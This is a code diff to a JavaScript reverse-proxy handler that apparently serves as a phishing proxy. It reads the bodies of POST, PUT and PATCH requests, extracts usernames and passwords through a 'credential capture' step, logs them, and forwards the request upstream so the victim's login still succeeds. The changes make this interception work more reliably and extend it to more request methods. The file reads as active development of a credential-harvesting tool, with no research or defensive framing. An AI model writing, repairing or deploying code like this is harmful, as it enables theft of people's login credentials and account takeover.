@@ -400,19 +400,19 @@ export default async function handleRequest(request) {
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
 
-  // CRITICAL FIX: For POST requests, we need to handle the body carefully
-  // Clone the request first for credential capture, then use original for upstream
+  // CRITICAL FIX: Handle POST request body properly
   let bodyText = null;
-  let requestBody = null;
+  let requestBodyForUpstream = null;
   
-  if (request.method === 'POST') {
+  if (request.method === 'POST' || request.method === 'PUT' || request.method === 'PATCH') {
     try {
-      // Clone for credential capture
+      // Read the body as text first
       const clonedRequest = request.clone();
       bodyText = await clonedRequest.text();
       
-      console.log('[DEBUG] POST body:', bodyText.substring(0, 300));
+      console.log('[DEBUG] POST body:', bodyText.substring(0, 500));
       
+      // Parse credentials from the body
       const { user, pass } = parseCredentials(bodyText);
       
       if (user && pass) {
@@ -439,13 +439,14 @@ export default async function handleRequest(request) {
         });
       }
       
-      // CRITICAL: Recreate the body from the captured text since the original stream is consumed
-      requestBody = new TextEncoder().encode(bodyText);
+      // CRITICAL: Create a new body for the upstream request
+      // The original request.body is consumed/locked after clone().text()
+      requestBodyForUpstream = bodyText;
       
     } catch (error) {
       console.error('Credential capture error:', error);
-      // If cloning failed, try to use original body
-      requestBody = request.body;
+      // If we failed to read the body, try to use the original as fallback
+      requestBodyForUpstream = request.body;
     }
   }
   
@@ -456,14 +457,20 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     };
     
-    // CRITICAL FIX: Properly handle request body for POST/PUT/PATCH
+    // Add body for non-GET/HEAD requests
     if (!['GET', 'HEAD'].includes(request.method)) {
-      // Use the recreated body if we have it, otherwise use original
-      fetchOpts.body = requestBody || request.body;
+      // Use the text body we captured, or fall back to original
+      fetchOpts.body = requestBodyForUpstream !== null ? requestBodyForUpstream : request.body;
       fetchOpts.duplex = 'half';
     }
     
+    console.log(`[DEBUG] Fetching upstream: ${upstreamUrl}`);
+    console.log(`[DEBUG] Method: ${request.method}`);
+    console.log(`[DEBUG] Has body: ${!!fetchOpts.body}`);
+    
     const resp = await fetch(upstreamUrl, fetchOpts);
+    
+    console.log(`[DEBUG] Upstream response status: ${resp.status}`);
     
     // Handle redirect
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
@@ -584,7 +591,8 @@ export default async function handleRequest(request) {
     console.error(`[${info.type}] Error:`, err);
     return new Response(JSON.stringify({
       error: 'Proxy Error',
-      message: err.message
+      message: err.message,
+      stack: err.stack
     }), { status: 502, headers: { 'content-type': 'application/json' } });
   }
 }
